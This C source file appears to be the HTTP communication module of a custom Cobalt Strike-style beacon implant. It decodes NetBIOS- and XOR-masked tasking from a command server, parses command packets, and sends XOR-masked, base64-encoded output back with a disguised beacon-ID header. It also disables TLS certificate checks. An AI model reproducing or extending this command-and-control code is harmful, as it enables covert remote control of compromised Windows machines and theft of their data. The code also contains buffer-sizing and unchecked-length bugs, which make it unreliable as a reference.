#include "Http.h"
#include "Config.h"
#include "Util.h"

#define MAX_HEADER_SIZE 1024

char* removePrefixAndSuffix(unsigned char* data, unsigned char* prefix, unsigned char* suffix) {
    size_t prefixLen = strlen(prefix);
    size_t suffixLen = strlen(suffix);
    size_t dataLen = strlen(data);

    if (strncmp(data, prefix, prefixLen) == 0 &&
        strncmp(data + (dataLen - suffixLen), suffix, suffixLen) == 0) {
        data[dataLen - suffixLen] = '\0';
        return data + prefixLen;
    }

    return data; 
}

unsigned char* parseGetResponse(unsigned char* data, size_t dataSize ,size_t* responsedatalen) {

    //ȥ�� data= �� %%
    data = removePrefixAndSuffix(data, Response_prepend, Response_append);

    int data_length = strlen(data);
    unsigned char netbiosKey = 'a'; 
    size_t NetbiosDecodedatalen;

    // NetBIOS ����
    unsigned char* NetbiosDecodedata = NetbiosDecode((unsigned char*)data, data_length, netbiosKey ,&NetbiosDecodedatalen);

    unsigned char* Error = "Error";

    // ������������Ԥ�ڻ����ݲ���
    if (NetbiosDecodedatalen < 5) {
        *responsedatalen = 4;
        return Error;
    }

    // Mask ���룬���� XOR ����
    // ǰ���ֽ�Ϊ XOR ��Կ
    unsigned char key[] = { NetbiosDecodedata[0], NetbiosDecodedata[1], NetbiosDecodedata[2], NetbiosDecodedata[3] };
    int key_length = sizeof(key) / sizeof(key[0]);
    size_t MaskDecodedatalen = NetbiosDecodedatalen - 4;
    unsigned char* MaskDecodedata= MaskDecode((unsigned char*)&NetbiosDecodedata[4], MaskDecodedatalen, key, key_length);

    *responsedatalen = MaskDecodedatalen;

    return MaskDecodedata;
}


unsigned char* parsePacket(unsigned char* decryptedBuf, uint32_t* totalLength, uint32_t* commandType ,size_t* commandBuflen , size_t* executeCount) {

    // ���ݰ���ʽ��cmdType(4Bytes) | commandLen(4Bytes) | commandBuf || cmdType(4Bytes) | commandLen(4Bytes) | commandBuf(4Bytes) || ...
    // commandLen ֻ�� commandBuf �ĳ���

    unsigned char* decryptedBuffer;

    if (*executeCount > 0) {

        decryptedBuffer = decryptedBuf + (int)*executeCount;
    }
    else
    {
        decryptedBuffer = decryptedBuf;
    }

    uint8_t commandTypeBytes[4];
    unsigned char* commandTypeBytesStart = decryptedBuffer;
    memcpy(&commandTypeBytes, commandTypeBytesStart, 4);
    *commandType = bigEndianUint32(commandTypeBytes);

    uint8_t commandLenBytes[4];
    unsigned char* commandLenBytessStart = decryptedBuffer + 4;
    memcpy(&commandLenBytes, commandLenBytessStart, 4);
    uint32_t commandLen = bigEndianUint32(commandLenBytes);

    unsigned char* commandBuf = (unsigned char*)malloc(commandLen);
    unsigned char* commandBufStart = decryptedBuffer + 8;
    memcpy(commandBuf, commandBufStart, commandLen);
    
    *totalLength = *totalLength - (4 + 4 + commandLen); // ����ʣ�µ� command ���ݰ�����
    *commandBuflen = commandLen;                        // ����ֵ

    *executeCount = *executeCount + commandLen + 8;

    return commandBuf;
}

unsigned char* GET(wchar_t* cookie_header, size_t* responseSize) {
    // ������Ҫע�⣬��ʹ�����û��ָ�Ҳ�ᷢ��һЩ���ݣ��������ﷵ��һ����Ϊ��
    // ������ data=nihcgakh%%
    // ��ʼ�� WinHttp �Ự
    HINTERNET hSession = WinHttpOpen(NULL,
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    if (!hSession) {
        printf("WinHttpOpen failed: %lu", GetLastError());
        exit(1);
    }

    // ���ӵ�������
    HINTERNET hConnect = WinHttpConnect(hSession, server, port, 0);

    if (!hConnect) {
        printf("WinHttpConnect failed: %lu\n", GetLastError());
        WinHttpCloseHandle(hSession);
        exit(1);
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect,
        L"GET",
        get_path,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0);
    if (!hRequest) {
        printf("WinHttpOpenRequest failed: %lu\n", GetLastError());
        CloseHandle(hSession);
        CloseHandle(hConnect);
        exit(1);
    }

    // �������ͷ
    WinHttpAddRequestHeaders(hRequest, host_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
    WinHttpAddRequestHeaders(hRequest, cookie_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
    WinHttpAddRequestHeaders(hRequest, user_agent_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        printf("WinHttpSendRequest failed: %lu\n", GetLastError());
        CloseHandle(hSession);
        CloseHandle(hConnect);
        CloseHandle(hRequest);
        exit(1);
    }

    // ������Ӧ
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        printf("WinHttpReceiveResponse failed: %lu\n", GetLastError());
        CloseHandle(hSession);
        CloseHandle(hConnect);
        CloseHandle(hRequest);
    }

    // ��ȡ��Ӧ������
    DWORD bytesAvailable;
    DWORD bytesRead;
    unsigned char* responseData = NULL;
    size_t totalSize = 0;
    char buffer[4096];

    while (WinHttpQueryDataAvailable(hRequest, &bytesAvailable) && bytesAvailable > 0) {
        if (!WinHttpReadData(hRequest, buffer, min(bytesAvailable, sizeof(buffer)), &bytesRead)) {
            fprintf(stderr, "WinHttpReadData failed: %lu\n", GetLastError());
            if (responseData) {
                free(responseData);
            }
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return NULL;
        }

        // ��̬�����ڴ��С
        unsigned char* temp = (unsigned char*)realloc(responseData, totalSize + bytesRead);
        if (!temp) {
            fprintf(stderr, "realloc failed: %lu\n", GetLastError());
            if (responseData) {
                free(responseData);
            }
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return NULL;
        }
        responseData = temp;

        memcpy(responseData + totalSize, buffer, bytesRead);
        totalSize += bytesRead;
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    *responseSize = totalSize;

    return responseData;
}

unsigned char* makeBeaconIdHeader() {
    int temp = clientID; // beacon id
    int digitCount = 0;  // beacon id λ��
    while (temp != 0) {
        temp /= 10;
        ++digitCount;
    }

    // �����ַ�����ĳ��ȣ��������ź���ֹ���� '\0'
    int charArrayLength = (clientID < 0) ? digitCount + 2 : digitCount + 1;

    // ʹ�� malloc ��̬�����㹻���ڴ����洢ת������ַ���
    unsigned char* CharId = (unsigned char*)malloc(charArrayLength * sizeof(char) - 1);
    if (CharId == NULL) {
        free(CharId);
        exit(1);
    }

    sprintf(CharId, "%d", clientID);
    size_t codelen;
    // xor beacon id
    unsigned char* MaskEncodeid = MaskEncode(CharId, charArrayLength * sizeof(char) - 1, &codelen);

    unsigned char netbiosKey = 'A'; // Replace 'a' with your desired key
    size_t NetbiosEncodeIdlen;
    // NetBios beacon id
    unsigned char* id = NetbiosEncode(MaskEncodeid, strlen(MaskEncodeid), netbiosKey, &NetbiosEncodeIdlen);
    id[NetbiosEncodeIdlen] = '\0';

    char header[] = "User:";
    unsigned char* concatenatedString = (unsigned char*)malloc(strlen(id) + strlen(header) + strlen(Http_post_id_prepend) + strlen(Http_post_id_append) + 1);

    // User:user=APNDCONJDOOBBMOKDPOB%%
    snprintf(concatenatedString, strlen(id) + strlen(header) + strlen(Http_post_id_prepend) + strlen(Http_post_id_append) + 1, "%s%s%s%s", header, Http_post_id_prepend, id, Http_post_id_append);

    free(CharId);

    return concatenatedString;
}

unsigned char* makePostData(unsigned char* buff, size_t Bufflen, int callback) {
    size_t buff_length;
    unsigned char* finalPaket = MakePacket(callback, buff, Bufflen, &buff_length);

    size_t code_length;
    // xor post
    unsigned char* MaskEncodedata = MaskEncode(finalPaket, buff_length, &code_length);
    // base64 post
    unsigned char* data = base64Encode(MaskEncodedata, code_length);

    unsigned char* dataString = (unsigned char*)malloc(strlen(data) + strlen(Http_post_client_output_prepend) + strlen(Http_post_client_output_append) + 1);

    // data = post%%
    // data=kXEmu5FxJvt2mIFuBzc6Z0B/LcirvoW86DBrQeAStEa97ZnOP8ohhvAqzwYtKM7vksTizVK7yXQe6bEsNN8fUGLAGDHlR4Y0%%
    strcpy(dataString, Http_post_client_output_prepend);
    strcat(dataString, data);
    strcat(dataString, Http_post_client_output_append);

    return dataString;
}

VOID POST(unsigned char* buf, size_t Bufflen, int callback) {
    unsigned char* BeaconIdHeader = makeBeaconIdHeader();
    unsigned char* dataString = makePostData(buf, Bufflen, callback);
    size_t dataSize = strlen((char*)dataString);

    wchar_t BeaconIdWideHeader[256];
    MultiByteToWideChar(CP_ACP, 0, BeaconIdHeader, -1, BeaconIdWideHeader, 256);

    // ��ʼ�� WinHttp �Ự
    HINTERNET hSession = WinHttpOpen(NULL,
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        printf("WinHttpOpen failed: %lu\n", GetLastError());
        return NULL;
    }

    // ���ӵ�������
    HINTERNET hConnect = WinHttpConnect(hSession, server, port, 0);
    if (!hConnect) {
        printf("WinHttpConnect failed: %lu\n", GetLastError());
        WinHttpCloseHandle(hSession);
        exit(1);
    }

    // ���� POST ����
    HINTERNET hRequest = WinHttpOpenRequest(hConnect,
        L"POST",
        post_path,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0);
    if (!hRequest) {
        printf("WinHttpOpenRequest failed: %lu\n", GetLastError());
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        exit(1);
    }

    WinHttpAddRequestHeaders(hRequest, BeaconIdWideHeader, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
    WinHttpAddRequestHeaders(hRequest, host_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
    WinHttpAddRequestHeaders(hRequest, user_agent_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
    WinHttpAddRequestHeaders(hRequest, server_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
    WinHttpAddRequestHeaders(hRequest, content_type_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);

    // ���ð�ȫ��־�Ժ���֤����֤����
    DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
        SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
        SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));

    // ���� POST ���󣬸�������������
    if (!WinHttpSendRequest(hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS, 0, // û�ж��������ͷ
        (LPVOID)dataString, dataSize,     // ���������ݺͳ���
        dataSize,                         // �����ݳ���
        0)) {
        printf("WinHttpSendRequest failed: %lu\n", GetLastError());
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        exit(1);
    }

    free(BeaconIdHeader);
    free(dataString);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}
